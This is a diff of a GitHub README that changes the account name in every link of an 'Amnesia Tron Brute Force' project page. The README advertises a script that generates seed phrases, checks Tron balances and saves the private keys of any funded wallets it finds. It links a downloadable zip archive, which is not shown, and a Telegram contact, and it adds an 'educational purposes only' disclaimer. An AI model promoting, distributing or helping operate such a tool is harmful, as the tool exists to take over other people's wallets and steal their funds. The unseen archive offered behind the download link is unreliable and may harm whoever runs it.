@@ -1,17 +1,17 @@
 <div align="center">
   <div>
-    <img src="https://raw.githubusercontent.com/amnesia214/Amnesia-Tron-Brute-Force/main/logo.png" alt="Amnesia Tron Brute Force Logo">
+    <img src="https://raw.githubusercontent.com/amnesia314/Amnesia-Tron-Brute-Force/main/logo.png" alt="Amnesia Tron Brute Force Logo">
   </div>
 </div>
 
 <p align="center">
   <br>
-  <img src="https://img.shields.io/github/stars/amnesia214/Amnesia-Tron-Brute-Force" alt="GitHub Stars">
-  <img src="https://img.shields.io/github/forks/amnesia214/Amnesia-Tron-Brute-Force" alt="GitHub Forks">
+  <img src="https://img.shields.io/github/stars/amnesia314/Amnesia-Tron-Brute-Force" alt="GitHub Stars">
+  <img src="https://img.shields.io/github/forks/amnesia314/Amnesia-Tron-Brute-Force" alt="GitHub Forks">
   
-    <p align="center">🔥 [Download](https://raw.githubusercontent.com/amnesia214/Amnesia-Tron-Brute-Force/main/Amnesia%20Tron%20Brute%20Force.zip) 🔥
+    <p align="center">🔥 [Download](https://raw.githubusercontent.com/amnesia314/Amnesia-Tron-Brute-Force/main/Amnesia%20Tron%20Brute%20Force.zip) 🔥
   <br>
-  💎 [Contact in Telegram](https://t.me/amnesia214) 💎
+  💎 [Contact in Telegram](https://t.me/amnesia314) 💎
   <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 </p>
 
@@ -19,7 +19,7 @@
 
 This script is designed to automate the generation of seed phrases and the checking of balances on the Tron network. If a wallet with a non-zero balance is detected, the wallet's details—including address, mnemonic, private key, and balance—are logged and saved to a file named `result.txt`.
 
-![Preview](https://raw.githubusercontent.com/amnesia214/Amnesia-Tron-Brute-Force/main/preview.png)
+![Preview](https://raw.githubusercontent.com/amnesia314/Amnesia-Tron-Brute-Force/main/preview.png)
 
 ## Usage
 
@@ -31,4 +31,4 @@ This script is intended for educational purposes only. The creator of this scrip
 
 ## Reporting Issues
 
-If you encounter any issues while using this script, please report them [here](https://t.me/amnesia214).        
+If you encounter any issues while using this script, please report them [here](https://t.me/amnesia314).        
